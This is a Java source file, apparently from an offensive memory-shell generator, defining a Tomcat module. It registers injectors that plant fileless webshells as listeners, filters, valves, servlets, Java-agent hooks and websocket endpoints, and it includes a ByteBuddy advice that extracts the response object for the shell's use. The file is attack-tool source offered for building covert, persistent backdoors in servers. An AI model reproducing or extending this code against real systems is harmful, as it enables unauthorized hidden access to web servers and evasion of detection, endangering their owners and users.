package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.injector.tomcat.*;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.implementation.bytecode.assign.Assigner;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/11/22
 */
public class TomcatShell extends AbstractShell {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false, typing = Assigner.Typing.DYNAMIC) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "request"), "response");
            } catch (Exception e) {
                response = ShellCommonUtil.getFieldValue(request, "response");
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, TomcatListenerInjector.class)
                .addInjector(JAKARTA_LISTENER, TomcatListenerInjector.class)
                .addInjector(FILTER, TomcatFilterInjector.class)
                .addInjector(JAKARTA_FILTER, TomcatFilterInjector.class)
                .addInjector(VALVE, TomcatValveInjector.class)
                .addInjector(JAKARTA_VALVE, TomcatValveInjector.class)
                .addInjector(SERVLET, TomcatServletInjector.class)
                .addInjector(JAKARTA_SERVLET, TomcatServletInjector.class)
                .addInjector(AGENT_FILTER_CHAIN, TomcatFilterChainAgentInjector.class)
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, TomcatContextValveAgentInjector.class)
                .addInjector(WEBSOCKET, TomcatWebSocketInjector.class)
                .build();
    }
}